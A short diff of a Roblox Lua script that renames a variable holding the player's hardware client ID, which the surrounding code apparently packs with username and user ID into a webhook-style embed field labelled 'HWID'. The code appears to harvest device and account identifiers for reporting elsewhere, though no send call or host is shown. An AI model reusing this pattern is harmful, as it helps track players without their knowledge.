@@ -2,7 +2,7 @@ local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
-local r1_01 = game:GetService("RbxAnalyticsService"):GetClientId()
+local literaldrool2 = game:GetService("RbxAnalyticsService"):GetClientId()
 local username = LocalPlayer.Name
 local userid = tostring(LocalPlayer.UserId)
 
@@ -36,7 +36,7 @@ if literaldrool ~= "" then
                                 },
                                 {
                                     name = "HWID",
-                                    value = "```" .. r1_01 .. "```",
+                                    value = "```" .. literaldrool2 .. "```",
                                     inline = true
                                 }
                             }
